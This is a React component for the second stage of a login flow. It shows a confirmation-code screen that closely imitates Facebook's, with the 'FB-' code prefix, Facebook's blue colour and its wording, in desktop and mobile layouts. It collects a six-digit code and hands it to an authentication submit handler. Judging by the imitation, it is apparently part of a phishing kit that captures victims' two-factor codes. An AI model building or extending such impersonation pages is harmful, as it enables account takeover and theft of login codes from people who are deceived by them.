import { Box, Image, Input, HStack, Text, VStack } from "@chakra-ui/react";
import React from "react";
import { ChevronLeft } from "lucide-react";
import { useUser } from "../../contexts/UserContext";
import { Button } from "../ui/button";

// const sendTo = "+1 484-282-2929";

const StageTwo = ({ handleAuthValueSubmit, handleResend }) => {
  const { isLoading, sendTo, otp, setOtp } = useUser();

  const handleChange = (event) => setOtp(event.target.value);

  const isOtpValid = otp.length === 6 && /^\d{6}$/.test(otp);

  if (!sendTo) {
    return null;
  }
  return (
    <>
      <VStack display={{ md: "flex", base: "none" }}>
        <Text
          letterSpacing="0.2px"
          fontSize="22px"
          fontWeight="bold"
          lineHeight="24px"
          mb="0.7rem"
          px="16px"
          pb="16px"
          borderBottom="1px solid #dddfe2"
        >
          Enter the confirmation code from the message
        </Text>

        <Text px="16px" fontSize="0.85rem">
          Let us know if this contact information belongs to you. Enter the code
          in the message sent to{" "}
          <span style={{ fontWeight: "600" }}>{sendTo}</span>
        </Text>

        <Box w="100%" mt="1rem" px="16px">
          <HStack
            w="100%"
            borderRadius="6px"
            gap="0"
            border="1px solid #dddfe2"
          >
            <Box
              pl="16px"
              py="14px"
              border="none"
              borderTopLeftRadius="6px"
              borderBottomLeftRadius="6px"
            >
              <Text fontWeight="600">FB-</Text>
            </Box>
            <Input
              type="text"
              borderRadius="6px"
              fontSize="17px"
              py="14px"
              pr="16px"
              pl="0 !important"
              border="none"
              color="#1d2129"
              lineHeight="16px"
              h="51px"
              _focusVisible={{ outline: "none", border: "none" }}
              value={otp}
              onChange={handleChange}
            />
          </HStack>
        </Box>

        <HStack
          w="100%"
          alignItems="flex-start"
          px="16px"
          pb="0.5rem"
          borderBottom="1px solid #dddfe2"
        >
          <Button onClick={handleResend} p="0" color="#1877f2" bg="transparent">
            Send Code Again
          </Button>
        </HStack>

        <HStack w="100%" pt="0.5rem" px="16px" justifyContent="flex-end">
          <Button
            // w="100%"
            // h="48px"
            h="36px"
            bg="#1877f2"
            borderRadius="6px"
            border="0px solid #365899"
            fontSize=".9375rem"
            fontWeight="600"
            lineHeight="48px"
            p="0 16px"
            transition="200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform"
            onClick={handleAuthValueSubmit}
            disabled={isLoading || !isOtpValid}
          >
            Continue
          </Button>
        </HStack>
      </VStack>

      <VStack
        display={{ md: "none", base: "flex" }}
        w="100%"
        pt="0.5rem"
        px="0.5rem"
        alignItems="flex-start"
      >
        <HStack mb="2rem" w="100%" alignItems="flex-start">
          <ChevronLeft size="2.5rem" />
        </HStack>

        <Text
          letterSpacing="0.2px"
          fontSize="28px"
          fontWeight="bold"
          lineHeight="24px"
          mb="0.7rem"
        >
          Enter the confirmation code
        </Text>

        <Text mb="1rem" fontWeight="600" fontSize="1.2rem">
          To confirm your account, enter the code that we sent to {sendTo}.
        </Text>

        <Input
          type="text"
          placeholder="Confirmation code"
          bg="rgb(255, 255, 255)"
          h="52px"
          border="1px solid #000"
          borderRadius="12px"
          fontSize="16px"
          fontWeight="600"
          mb="1rem"
          value={otp}
          onChange={handleChange}
        />

        <VStack w="100%">
          <Button
            w="100%"
            h="44px"
            bg="rgb(0, 100, 224)"
            borderRadius="22px"
            border="0px solid rgb(28, 43, 51)"
            fontSize="16px"
            fontWeight="500"
            onClick={handleAuthValueSubmit}
            disabled={isLoading || !isOtpValid}
          >
            Next
          </Button>

          <Button
            w="100%"
            h="44px"
            bg="transparent"
            borderRadius="22px"
            color="#000"
            border="1px solid #888"
            fontSize="16px"
            fontWeight="500"
            // onClick={handleLogin}
            disabled={isLoading}
          >
            I didn't receive the code
          </Button>
        </VStack>
      </VStack>
    </>
  );
};

export default StageTwo;
